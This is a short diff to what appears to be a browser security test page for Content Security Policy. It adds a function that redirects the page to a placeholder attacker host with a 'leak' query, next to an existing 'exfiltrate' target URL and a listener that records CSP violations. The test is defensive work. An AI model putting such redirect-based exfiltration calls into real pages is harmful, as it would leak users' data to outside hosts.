@@ -43,6 +43,10 @@
 
     const UNAUTHORIZED_TARGET = 'https://unauthorized-attacker.example.com/exfiltrate';
 
+    window.attemptSelfNavigation = () => {
+      location.href = 'https://unauthorized-attacker.example.com/x?leak=1';
+    };
+
     // Catch CSP violation events
     document.addEventListener('securitypolicyviolation', (e) => {
       window.__testResult.violations.push({
